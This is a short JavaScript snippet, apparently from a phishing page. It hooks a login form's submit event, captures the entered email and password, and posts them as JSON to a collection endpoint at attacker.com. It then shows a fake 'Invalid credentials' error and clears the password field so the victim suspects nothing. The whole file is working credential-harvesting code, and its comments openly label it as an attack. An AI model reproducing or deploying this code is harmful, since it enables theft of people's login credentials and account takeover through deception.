document.getElementById("login-form").addEventListener("submit", function(event) {
    event.preventDefault();

    // Capture user input
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    // Send credentials to attacker
    fetch("https://attacker.com/steal", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: email, password: password })
    });

    // Show fake error message
    document.getElementById("error-msg").innerText = "Invalid credentials. Please try again.";
    
    // Clear password field
    document.getElementById("password").value = "";
});
